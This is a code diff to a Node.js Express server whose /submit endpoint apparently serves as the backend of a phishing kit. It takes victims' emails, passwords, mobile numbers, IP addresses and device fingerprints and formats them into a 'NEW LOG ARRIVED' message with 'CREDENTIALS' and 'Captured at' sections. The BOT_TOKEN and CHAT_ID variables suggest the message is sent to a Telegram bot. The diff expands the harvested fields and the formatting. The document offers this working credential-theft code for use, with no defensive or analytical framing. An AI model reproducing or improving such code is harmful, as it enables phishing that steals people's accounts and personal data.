@@ -9,19 +9,39 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 app.post('/submit', async (req, res) => {
+    const deviceInfo = req.body.deviceInfo || {};
+    const ipAddr = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
     const message = `
-🚀 NEW LOG ARRIVED 🚀
-━━━━━━━━━━━━━━━━━━
-📂 Portal: ${req.body.page || 'Unknown'}
-Label: \`${req.body.type}\`
+🚀 *NEW LOG ARRIVED* 🚀
+━━━━━━━━━━━━━━━━━━━━━━━━━
+📂 *Portal:* ${req.body.page || 'Unknown'}
+🔖 *Label:* \`${req.body.type || 'N/A'}\`
 
-📧 Email: \`${req.body.email}\`
-🔑 Password: \`${req.body.pwd}\`
-📱 Mobile: \`${req.body['ms-mobile']}\`
+*CREDENTIALS*
+━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 *Email:*
+\`\`\`
+${req.body.email || 'N/A'}
+\`\`\`
+🔑 *Password:*
+\`\`\`
+${req.body.pwd || 'N/A'}
+\`\`\`
+📱 *Mobile:*
+\`\`\`
+${req.body['ms-mobile'] || 'N/A'}
+\`\`\`
 
-🌐 IP Address: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
-━━━━━━━━━━━━━━━━━━
-⏰ *Captured at: ${new Date().toLocaleString()}*
+*TECHNICAL SPECS*
+━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 *Platform:* \`${deviceInfo.platform || 'Unknown'}\`
+🖥️ *Screen:* \`${deviceInfo.screenResolution || 'Unknown'}\`
+🌐 *IP Address:* \`${ipAddr}\`
+📱 *User Agent:* \`${(deviceInfo.userAgent || 'N/A').substring(0, 80)}...\`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ *Captured at:* ${new Date().toLocaleString()}
 `;
 
     try {
